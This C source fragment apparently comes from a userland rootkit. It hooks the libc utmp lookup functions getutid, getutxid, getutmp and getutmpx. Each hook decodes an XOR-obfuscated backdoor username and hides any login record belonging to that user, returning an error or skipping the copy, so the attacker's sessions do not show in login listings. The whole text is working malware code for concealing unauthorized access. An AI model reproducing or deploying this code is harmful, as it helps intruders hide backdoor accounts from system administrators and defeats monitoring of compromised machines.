struct utmp *getutid(const struct utmp *ut)
{
    HOOK(o_getutid,CGETUTID);
    struct utmp *tmp = o_getutid(ut);

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); errno=ESRCH; return NULL; }
        CLEAN(bduname);
    }

    return o_getutid(ut);
}

struct utmpx *getutxid(const struct utmpx *utx)
{
    HOOK(o_getutxid,CGETUTXID);
    struct utmpx *tmp = o_getutxid(utx);

    if(tmp && tmp->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)tmp->ut_user,bduname)) { CLEAN(bduname); errno=ESRCH; return NULL; }
        CLEAN(bduname);
    }

    return o_getutxid(utx);
}

void getutmp(const struct utmpx *ux, struct utmp *u)
{
    if(ux && ux->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)ux->ut_user,bduname)) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_getutmp,CGETUTMP);
    o_getutmp(ux,u);
}

void getutmpx(const struct utmp *u, struct utmpx *ux)
{
    if(u && u->ut_user != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp((char *)u->ut_user,bduname)) { CLEAN(bduname); return; }
        CLEAN(bduname);
    }

    HOOK(o_getutmpx,CGETUTMPX);
    o_getutmpx(u,ux);
}
